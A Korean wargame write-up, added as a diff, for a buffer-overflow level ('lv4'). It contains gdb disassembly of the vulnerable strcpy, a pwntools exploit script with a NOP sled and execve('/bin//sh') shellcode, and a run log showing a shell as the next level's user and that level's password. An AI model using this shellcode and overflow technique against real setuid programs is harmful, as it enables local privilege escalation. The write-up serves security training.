@@ -1,0 +1,102 @@
+﻿# Lv3 -> Lv4
+## lv4
+gdb를 이용해 lv4 바이너리를 분석해 보면 다음과 같다.
+
+
+```asm
+   ;
+   ; 환경변수를 초기화 하는 루틴
+   ;
+   0x08048523 <+35>:	nop
+   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
+   0x0804852b <+43>:	nop
+   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
+   0x0804853a <+58>:	mov    eax,ds:0x8049750
+   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
+   0x08048543 <+67>:	jne    0x8048547 <main+71>
+   0x08048545 <+69>:	jmp    0x8048587 <main+135>
+   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
+   0x08048551 <+81>:	mov    eax,ds:0x8049750
+   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048559 <+89>:	push   edx
+   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
+   0x0804855f <+95>:	add    esp,0x4
+   0x08048562 <+98>:	mov    eax,eax
+   0x08048564 <+100>:	push   eax
+   0x08048565 <+101>:	push   0x0
+   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
+   0x08048571 <+113>:	mov    eax,ds:0x8049750
+   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048579 <+121>:	push   edx
+   0x0804857a <+122>:	call   0x8048430 <memset@plt>
+   0x0804857f <+127>:	add    esp,0xc
+   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
+   0x08048585 <+133>:	jmp    0x8048530 <main+48>    
+```
+
+```asm
+   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804858a <+138>:	add    eax,0x4
+   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
+   0x0804858f <+143>:	add    edx,0x2f
+   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
+   0x08048595 <+149>:	je     0x80485b0 <main+176>	; if (argv[1][47] == 0xff)
+```
+
+```asm
+   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485b3 <+179>:	add    eax,0x4
+   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
+   0x080485b8 <+184>:	push   edx
+   0x080485b9 <+185>:	lea    eax,[ebp-0x28]		; buf : [ebp - 0x28]
+   0x080485bc <+188>:	push   eax
+   0x080485bd <+189>:	call   0x8048440 <strcpy@plt>	; strcpy(buf, argv[1]);
+```
+
+이 문제는 환경변수를 사용할 수 없고, ret 값은 0xff로 시작하는 스택 주소로 덮어 씌워야 한다. 
+argv[1]에는 buf~ret을 덮어씌울 문자열을 넣고, argv[2]에 NOP을 포함하는 쉘코드를 넣어서 문제를 해결했다.
+
+## exploit.py
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+argv1 = "a"*0x2c  +  "\x90\xd3\xff\xff"
+argv2 = "\x90"*2000 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
+
+p = process(['./lv4', argv1, argv2])
+p.recvuntil('\n')
+p.sendline('id')
+p.recvuntil('\n')
+p.sendline('my-pass')
+p.interactive()
+```
+------
+
+```
+lv3@ubuntu:~$ python exploit.py 
+Starting local process './lv4' argv=['./lv4', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\xd3\xff\xff', '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90 .... \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0\xb01\xcd\x80\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'] 
+[DEBUG] Received 0x31 bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000020  61 61 61 61  61 61 61 61  61 61 61 61  90 d3 ff ff  │aaaa│aaaa│aaaa│····│
+    00000030  0a                                                  │·│
+    00000031
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x2d bytes:
+    'uid=1004(lv4) gid=1003(lv3) groups=1003(lv3)\n'
+[DEBUG] Sent 0x8 bytes:
+    'my-pass\n'
+[*] Switching to interactive mode
+[DEBUG] Received 0xb bytes:
+    'broken egg\n'
+broken egg
+$ 
+```
